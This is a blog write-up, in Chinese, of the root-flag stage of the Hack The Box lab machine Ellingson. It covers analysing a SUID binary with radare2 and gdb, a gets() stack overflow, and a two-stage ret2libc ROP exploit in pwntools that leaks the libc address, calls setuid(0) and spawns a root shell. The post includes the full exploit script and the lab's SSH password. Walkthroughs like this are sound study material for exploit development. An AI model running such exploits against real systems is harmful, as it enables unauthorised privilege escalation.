---
layout: post
title: "[writeup] HTB Ellingson-Part 2(Root Flag)"
date: 2019-10-23 00:00:00 +0800
author: xiangxiang
categories: HTB writeup
tags: [htb hackthebox writup ellingson pwn stackoverflow pwntools gdb radare2 root]
---

Let's `StackOverflow` to `root`

## 0x00 信息收集
- 在获得margo账户的权限后，老规矩先跑一下[LinEnum](https://github.com/rebootuser/LinEnum)

- 在LinEnum结果，SUID文件中有一个文件`/usr/bin/garbage`的名字及日期引起了注意
{% highlight console %}
[00;31m[-] SUID files:[00m
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 40344 Jan 25  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22520 Jul 13  2018 /usr/bin/pkexec
-rws------ 1 root root 59640 Jan 25  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 75824 Jan 25  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 18056 Mar  9  2019 /usr/bin/garbage
-rwsr-xr-x 1 root root 37136 Jan 25  2018 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 149080 Jan 18  2018 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Mar  9  2017 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 76496 Jan 25  2018 /usr/bin/chfn
以下省略...
{% endhighlight %}

- 运行一下`garbage`，应该就是它了

{% highlight console %}
margo@ellingson:~$ garbage 
Enter access password: password

access denied.

margo@ellingson:~$ python3 -c 'print("A"*256)' | garbage 
Enter access password: 
access denied.
Segmentation fault (core dumped)

margo@ellingson:~$ ldd /usr/bin/garbage
	linux-vdso.so.1 (0x00007fffa818a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f26828f7000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f2682ce8000)
{% endhighlight %}

## 0x01 二进制分析
- 直接把garbade和Ellingson主机上的libc拉到本地来分析

{% highlight console %}
Ellingson # scp margo@10.10.10.139:/usr/bin/garbage ./
margo@10.10.10.139's password: 
garbage    100%   18KB  20.1KB/s   00:00    
Ellingson # scp margo@10.10.10.139:/lib/x86_64-linux-gnu/libc.so.6 ./
margo@10.10.10.139's password: 
libc.so.6  100% 1983KB 209.8KB/s   00:09
{% endhighlight %}

- 简单看一下`garbage`这个二进制文件
{% highlight console %}
Ellingson # checksec garbage
[*] '/tmp/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
{% endhighlight %}

- 看上去比较简单，直接使用radara2，不开windows虚拟机用ida看了

{% highlight nasm %}
Ellingson # r2 garbage
[0x00401170]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (aaft)
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00401170]> afl
0x00401000    3 23           sym._init
0x00401030    1 6            sym.imp.putchar
0x00401040    1 6            sym.imp.strcpy
0x00401050    1 6            sym.imp.puts
省略...
0x00401150    1 6            sym.imp.strcat
0x00401160    1 6            sym.imp.exit
0x00401170    1 43           entry0
0x004011a0    1 1            sym._dl_relocate_static_pie
0x004011b0    4 33   -> 31   sym.deregister_tm_clones
0x004011e0    4 49           sym.register_tm_clones
0x00401220    3 33   -> 28   sym.__do_global_dtors_aux
0x00401250    1 2            entry.init0
0x00401252    1 14           sym.func1
省略...
0x004012e1    1 53           sym.func9
0x00401316    1 19           sym.launch
0x00401329    1 19           sym.cancel
0x0040133c    1 32           sym.checkbalance
0x0040135c    1 43           sym.print_hex
0x00401387    1 43           sym.print_decimal
0x004013b2    1 167          sym.unused_func
0x00401459    6 123          sym.check_user
0x004014d4    3 63           sym.set_username
0x00401513    4 262          sym.auth
0x00401619   16 289          main
0x00401740    3 93   -> 84   sym.__libc_csu_init
0x004017a0    1 1            sym.__libc_csu_fini
0x004017a4    1 9            sym._fini
[0x00401170]> s main
[0x00401619]> pdf
/ (fcn) main 289
|   main (int argc, char **argv, char **envp);
|           ; var int local_8h @ rbp-0x8
|           ; var int local_4h @ rbp-0x4
|           ; DATA XREF from entry0 (0x40118d)
|           0x00401619      55             push rbp
|           0x0040161a      4889e5         mov rbp, rsp
|           0x0040161d      4883ec10       sub rsp, 0x10
|           0x00401621      b800000000     mov eax, 0
|           0x00401626      e82efeffff     call sym.check_user
|           0x0040162b      8945fc         mov dword [local_4h], eax
|           0x0040162e      8b45fc         mov eax, dword [local_4h]
|           0x00401631      89c7           mov edi, eax
|           0x00401633      e89cfeffff     call sym.set_username
|           0x00401638      8b45fc         mov eax, dword [local_4h]
|           0x0040163b      89c7           mov edi, eax
|           0x0040163d      e8d1feffff     call sym.auth
|           0x00401642      85c0           test eax, eax
|       ,=< 0x00401644      0f84e6000000   je 0x401730
|       |   0x0040164a      488d3d3f0b00.  lea rdi, qword str.W0rM____Control_Application ; 0x402190 ; "[+] W0rM || Control Application" ; const char *s
|       |   0x00401651      e8faf9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00401656      488d3d530b00.  lea rdi, qword str.         ; 0x4021b0 ; "[+] ---------------------------" ; const char *s
|       |   0x0040165d      e8eef9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00401662      488d3d670b00.  lea rdi, qword str.Select_Option ; 0x4021d0 ; "Select Option" ; const char *s
|       |   0x00401669      e8e2f9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0040166e      488d3d690b00.  lea rdi, qword str.1:_Check_Balance ; 0x4021de ; "1: Check Balance" ; const char *s
|       |   0x00401675      e8d6f9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x0040167a      488d3d6e0b00.  lea rdi, qword str.2:_Launch ; 0x4021ef ; "2: Launch" ; const char *s
|       |   0x00401681      e8caf9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00401686      488d3d6c0b00.  lea rdi, qword str.3:_Cancel ; 0x4021f9 ; "3: Cancel" ; const char *s
|       |   0x0040168d      e8bef9ffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x00401692      488d3d6a0b00.  lea rdi, qword str.4:_Exit  ; 0x402203 ; "4: Exit" ; const char *s
|       |   0x00401699      e8b2f9ffff     call sym.imp.puts           ; int puts(const char *s)
以下省略...
{% endhighlight %}

- overflow的问题出现在check_auth这个函数中，注意点是这里使用的是`gets`函数获取的用户输入。如果想不起来gets的问题，直接man一下。

{% highlight console %}
NAME
       gets - get a string from standard input (DEPRECATED)

SYNOPSIS
       #include <stdio.h>

       char *gets(char *s);

DESCRIPTION
       Never use this function.

       gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\0').  No check for buffer overrun is performed
       (see BUGS below).

RETURN VALUE
       gets() returns s on success, and NULL on error or when end of file occurs while no characters have been read.  However, given the lack of buffer overrun checking, there can be no  guarantees
       that the function will even return.
{% endhighlight %}

{% highlight nasm %}
[0x00401619]> s sym.auth 
[0x00401513]> pdf
/ (fcn) sym.auth 262
|   sym.auth (int arg1);
|           ; var int local_f4h @ rbp-0xf4
|           ; var char *s1 @ rbp-0xf0
|           ; var char *dest @ rbp-0x80
|           ; var int local_10h @ rbp-0x10
|           ; arg int arg1 @ rdi
|           ; CALL XREF from main (0x40163d)
|           0x00401513      55             push rbp
|           0x00401514      4889e5         mov rbp, rsp
|           0x00401517      4881ec000100.  sub rsp, 0x100
|           0x0040151e      89bd0cffffff   mov dword [local_f4h], edi  ; arg1
|           0x00401524      8b850cffffff   mov eax, dword [local_f4h]
|           0x0040152a      8945f0         mov dword [local_10h], eax
|           0x0040152d      488b05ac2b00.  mov rax, qword [obj.username] ; [0x4040e0:8]=0
|           0x00401534      488d5580       lea rdx, qword [dest]
|           0x00401538      4883c264       add rdx, 0x64               ; 'd'
|           0x0040153c      4889c6         mov rsi, rax                ; const char *src
|           0x0040153f      4889d7         mov rdi, rdx                ; char *dest
|           0x00401542      e8f9faffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
|           0x00401547      488d3df90b00.  lea rdi, qword str.Enter_access_password: ; 0x402147 ; "Enter access password: " ; const char *format
|           0x0040154e      b800000000     mov eax, 0
|           0x00401553      e838fbffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00401558      488d4580       lea rax, qword [dest]
|           0x0040155c      4889c7         mov rdi, rax                ; char *s
|           0x0040155f      b800000000     mov eax, 0
|           0x00401564      e897fbffff     call sym.imp.gets           ; char *gets(char *s)
|           0x00401569      bf0a000000     mov edi, 0xa                ; int c
|           0x0040156e      e8bdfaffff     call sym.imp.putchar        ; int putchar(int c)
|           0x00401573      488d4580       lea rax, qword [dest]
|           0x00401577      488d35e10b00.  lea rsi, qword str.N3veRF3_r1iSh3r3 ; 0x40215f ; "N3veRF3@r1iSh3r3!" ; const char *s2
|           0x0040157e      4889c7         mov rdi, rax                ; const char *s1
|           0x00401581      e85afbffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
|           0x00401586      85c0           test eax, eax
|       ,=< 0x00401588      757c           jne 0x401606
|       |   0x0040158a      488d8510ffff.  lea rax, qword [s1]
|       |   0x00401591      48be61636365.  movabs rsi, 0x6720737365636361 ; 'access g'
|       |   0x0040159b      48bf72616e74.  movabs rdi, 0x66206465746e6172 ; 'ranted f'
|       |   0x004015a5      488930         mov qword [rax], rsi
|       |   0x004015a8      48897808       mov qword [rax + 8], rdi
|       |   0x004015ac      48b96f722075.  movabs rcx, 0x3a7265737520726f ; 'or user:'
|       |   0x004015b6      48894810       mov qword [rax + 0x10], rcx
|       |   0x004015ba      66c740182000   mov word [rax + 0x18], 0x20 ; [0x20:2]=0xffff ; 32
|       |   0x004015c0      488d4580       lea rax, qword [dest]
|       |   0x004015c4      488d5064       lea rdx, qword [rax + 0x64] ; 'd' ; 100
|       |   0x004015c8      488d8510ffff.  lea rax, qword [s1]
|       |   0x004015cf      4889d6         mov rsi, rdx                ; const char *s2
|       |   0x004015d2      4889c7         mov rdi, rax                ; char *s1
|       |   0x004015d5      e876fbffff     call sym.imp.strcat         ; char *strcat(char *s1, const char *s2)
|       |   0x004015da      488d8510ffff.  lea rax, qword [s1]
|       |   0x004015e1      4889c6         mov rsi, rax
|       |   0x004015e4      bf06000000     mov edi, 6
|       |   0x004015e9      b800000000     mov eax, 0
|       |   0x004015ee      e81dfbffff     call sym.imp.syslog
|       |   0x004015f3      488d3d770b00.  lea rdi, qword str.access_granted. ; 0x402171 ; "access granted." ; const char *s
|       |   0x004015fa      e851faffff     call sym.imp.puts           ; int puts(const char *s)
|       |   0x004015ff      b801000000     mov eax, 1
|      ,==< 0x00401604      eb11           jmp 0x401617
|      ||   ; CODE XREF from sym.auth (0x401588)
|      |`-> 0x00401606      488d3d740b00.  lea rdi, qword str.access_denied. ; 0x402181 ; "access denied." ; const char *s
|      |    0x0040160d      e83efaffff     call sym.imp.puts           ; int puts(const char *s)
|      |    0x00401612      b800000000     mov eax, 0
|      |    ; CODE XREF from sym.auth (0x401604)
|      `--> 0x00401617      c9             leave
\           0x00401618      c3             ret
{% endhighlight %}

- 计算stackoverflow的offset, RBP寄存器里的字节offset为128字节，再加上64位系统的8字节，一共需要128+8=`136`字节的填充数据

{% highlight console %}
Ellingson # gdb -q ./garbage
Reading symbols from ./garbage...(no debugging symbols found)...done.
gdb-peda$ pattern_create 256
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G'
gdb-peda$ r
Starting program: /tmp/Ellingson/garbage 
Enter access password: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G

access denied.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7f037a88c924 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7f037a95d580 --> 0x0 
RSI: 0x13499c0 ("access denied.\nssword: ")
RDI: 0x0 
RBP: 0x6c41415041416b41 ('AkAAPAAl')
RSP: 0x7fff2964ab88 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
RIP: 0x401618 (<auth+261>:	ret)
R8 : 0xf 
R9 : 0x7f037a95b848 --> 0x7f037a95b760 --> 0xfbad2a84 
R10: 0x4005a5 --> 0x7475700073747570 ('puts')
R11: 0x246 
R12: 0x401170 (<_start>:	xor    ebp,ebp)
R13: 0x7fff2964ac80 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40160d <auth+250>:	call   0x401050 <puts@plt>
   0x401612 <auth+255>:	mov    eax,0x0
   0x401617 <auth+260>:	leave  
=> 0x401618 <auth+261>:	ret    
   0x401619 <main>:	push   rbp
   0x40161a <main+1>:	mov    rbp,rsp
   0x40161d <main+4>:	sub    rsp,0x10
   0x401621 <main+8>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fff2964ab88 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0008| 0x7fff2964ab90 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0016| 0x7fff2964ab98 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0024| 0x7fff2964aba0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0032| 0x7fff2964aba8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0040| 0x7fff2964abb0 ("AuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0048| 0x7fff2964abb8 ("AAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
0056| 0x7fff2964abc0 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401618 in auth ()
gdb-peda$ pattern_offset AkAAPAAl
AkAAPAAl found at offset: 128
{% endhighlight %}

## 0x02 如何构造ret2libc的ROP
- Stage 1 leak: 直接使用puts函数打印got.puts地址获取内存中libc gets的地址，利用leak得到的gets地址计算得到当前libc的地址
- Stage 2 ret2libc: 当然是利用libc为所欲为啦
- DEBUG的注意点: 本地的默认libc和远程服务器上的libc一般是不一样的，大多数遇到本地利用成功远程利用失败的都是这个原因

## 0x03 ROP stage1: Leak
- `puts`函数只有一个参数，x86-64的第一个参数传递使用的是`rdi`寄存器，所以需要在`garbage`中找到`pop rdi; ret`的gadget
```console
Ellingson # ROPgadget --binary garbage | grep 'pop rdi ; ret'
0x000000000040179b : pop rdi ; ret
```

- 接下来需要got.puts放在栈上(`0x404028`)，再者是puts的调用放在栈上(`0x401050`)
```console
Ellingson # objdump --disassemble-all garbage | grep puts -A 5
0000000000401050 <puts@plt>:
  401050:	ff 25 d2 2f 00 00    	jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
  401056:	68 02 00 00 00       	pushq  $0x2
  40105b:	e9 c0 ff ff ff       	jmpq   401020 <.plt>
```

- 最后是继续回到main函数(`0x401619`)
```console
Ellingson # objdump --disassemble-all garbage | grep '<main>' -A 5
0000000000401619 <main>:
  401619:	55                   	push   %rbp
  40161a:	48 89 e5             	mov    %rsp,%rbp
  40161d:	48 83 ec 10          	sub    $0x10,%rsp
  401621:	b8 00 00 00 00       	mov    $0x0,%eax
  401626:	e8 2e fe ff ff       	callq  401459 <check_user>
```

- 最终stack上leak阶段的ROP链大概是这样的
{% highlight text %}
高内存位-------------------------------------------------

main                  0x401619 # 回到main函数
plt.puts              0x401050 # 调用puts函数
got.puts              0x404028 # got.puts, puts调用的参数
check_auth的返回地址   0x40179b # pop rdi; ret

overflow填            AAAAAAAAAAAAA
充无用数据             AAAAAAAAAAAAA

低内存位------------------------------------------------
{% endhighlight %}

- pwntools验证，与人工分析得到的是一致的
{% highlight python %}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
context(os='linux', arch='amd64', log_level='INFO') # log_level='DEBUG'
context.binary = ELF('./garbage')

rop = ROP(context.binary)
rop.call(context.binary.plt['puts'], [context.binary.got['puts']])
rop.call(context.binary.symbols['main'])
log.info('=======leak ROP========')
log.info(rop.dump())
log.info('=======leak ROP========')
{% endhighlight %}

运行结果:
{% highlight console %}
Ellingson # python3 leak.py 
[*] '/tmp/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/tmp/Ellingson/garbage'
[*] =======leak ROP========
[*] 0x0000:         0x40179b pop rdi; ret
    0x0008:         0x404028 [arg0] rdi = got.puts
    0x0010:         0x401050
    0x0018:         0x401619 0x401619()
[*] =======leak ROP========
{% endhighlight %}

- leak后计算内存中libc的地址, Ellingson主机上libc的put位置是`0x809c0`, 使用leak得到的puts地址减去`0x809c0`就是libc在内存中的位置
{% highlight console %}
Ellingson # objdump --disassemble-all libc.so.6 | grep '_IO_puts' | head 
   7e9c7:	e8 f4 21 00 00       	callq  80bc0 <_IO_puts@@GLIBC_2.2.5+0x200>
   7f6ef:	e8 cc 14 00 00       	callq  80bc0 <_IO_puts@@GLIBC_2.2.5+0x200>
00000000000809c0 <_IO_puts@@GLIBC_2.2.5>:
   809e7:	75 5d                	jne    80a46 <_IO_puts@@GLIBC_2.2.5+0x86>
   809fd:	74 43                	je     80a42 <_IO_puts@@GLIBC_2.2.5+0x82>
   80a0b:	74 08                	je     80a15 <_IO_puts@@GLIBC_2.2.5+0x55>
   80a11:	75 07                	jne    80a1a <_IO_puts@@GLIBC_2.2.5+0x5a>
   80a13:	eb 1b                	jmp    80a30 <_IO_puts@@GLIBC_2.2.5+0x70>
   80a18:	74 16                	je     80a30 <_IO_puts@@GLIBC_2.2.5+0x70>
   80a4e:	0f 85 d4 00 00 00    	jne    80b28 <_IO_puts@@GLIBC_2.2.5+0x168>
{% endhighlight %}


## 0x03 ROP stage2: ret2libc
- 接下来其实就是利用libc构造提权以及获取shell的ROP了
- `garbage`是以margo用户运行，但由于具有SUID权限位且属主为root，所以可以执行需要root权限的调用
- 利用libc调用`suid(0)`变成`root`
- 利用libc调用`system('/bin/sh')`获得shell就大功告成了
{% highlight python %}
from pwn import *
context(os='linux', arch='amd64', log_level='DEBUG')
libc = ELF('./libc.so.6')

# GET leaked_put from stage 1
libc.address = leaked_puts - libc.symbols['puts']

# Create new ROP object with rebased libc
rop = ROP(libc)
rop.call(libc.sym.setuid, [0])
rop.system(next(libc.search(b'/bin/sh\x00')))
{% endhighlight %}

- DEBUG过常中遇到未解的坑: 在没有调用setuid时候，ret2libc应该可以拿到margo用户的shell，本地调试时候利用成功，但是远程利用失败。但是如果构造rop的时候连续调用两次`system('/bin/sh')`可以成功，有点迷。
```python
rop.system(next(libc.search(b'/bin/sh\x00')))
rop.system(next(libc.search(b'/bin/sh\x00')))
```

## 0x04 Full exploit
{% highlight python %}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context(os='linux', arch='amd64', log_level='INFO') 
context.binary = ELF('./garbage')
libc = ELF('./libc.so.6')

remote = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
p = remote.process('/usr/bin/garbage', shell=True)

# ============ Stage 1: leak ===================
rop = ROP(context.binary)
rop.call(context.binary.plt['puts'], [context.binary.got['puts']])
rop.call(context.binary.symbols['main'])
log.info('=======leak ROP========')
log.info(rop.dump())
log.info('=======leak ROP========')

payload = fit({136:rop.chain()})
p.sendlineafter('password: ', payload)
p.recvuntil('denied.\n')
tmp = p.recvline().strip() # carefully count bytes
leaked_puts = tmp.ljust(context.bytes, b"\x00")
log.info("Leak: {}".format(repr(leaked_puts)))
leaked_puts = struct.unpack('Q', leaked_puts)[0]

# ================Stage 2: ret2libc ===================
libc.address = leaked_puts - libc.symbols['puts']
log.info('Libc address: {}'.format(hex(libc.address)))

# Create new ROP object with rebased libc
rop2 = ROP(libc)
rop2.call(libc.sym.setuid, [0])
rop2.system(next(libc.search(b'/bin/sh\x00')))

log.info("=======rce ROP========")
log.info(rop2.dump())
log.info("=======rce ROP========")

payload = fit({136:rop2.chain()})
p.recvuntil("Enter access password: ")
p.sendline(payload)
p.clean()
p.interactive()
{% endhighlight %}

## 0x05 Get `root` flag
{% highlight console %}
Ellingson # python3 ellingson_exploit.py 
[*] '/root/Desktop/Ellingson/garbage'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/root/Desktop/Ellingson/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 10.10.10.139 on port 22: Done

[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process b'/bin/sh' on 10.10.10.139: pid 4037
[*] Loaded cached gadgets for './garbage'
[*] =======leak ROP========
[*] 0x0000:         0x40179b pop rdi; ret
    0x0008:         0x404028 [arg0] rdi = got.puts
    0x0010:         0x401050
    0x0018:         0x401619 0x401619()
[*] =======leak ROP========
[*] Leak: b'\xc0\xc97*\xf5\x7f\x00\x00'
[*] Libc address: 0x7ff52a2fc000
[*] Loaded cached gadgets for './libc.so.6'
[*] =======rce ROP========
[*] 0x0000:   0x7ff52a31d55f pop rdi; ret
    0x0008:              0x0 [arg0] rdi = 0
    0x0010:   0x7ff52a3e1970
    0x0018:   0x7ff52a31d55f pop rdi; ret
    0x0020:   0x7ff52a4afe9a [arg0] rdi = 140690953272986
    0x0028:   0x7ff52a34b440 system
[*] =======rce ROP========
[*] Switching to interactive mode

access denied.
# $ id
uid=0(root) gid=1002(margo) groups=1002(margo)
# $ cd /root
# $ ls
root.txt
# $ cat root.txt
1cc73a448021ea81aee6c029a3d2f997
{% endhighlight %}